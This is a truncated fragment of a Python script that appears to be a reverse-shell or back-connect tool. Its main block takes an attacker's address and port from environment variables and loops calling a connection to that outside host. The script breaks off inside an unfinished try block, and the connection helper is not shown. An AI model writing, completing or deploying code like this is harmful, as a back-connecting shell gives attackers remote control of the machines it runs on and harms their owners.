...
if __name__ == '__main__':
    attacker_host = os.getenv("ATTACKER_ADDRESS")
    attacker_port = int(os.getenv("ATTACKER_PORT"))
    print(f"Back-connect to {attacker_host}:{attacker_port}")
    while True:
        try:
            create_connection(attacker_host, attacker_port)  # TODO: later will be defined by the attacker
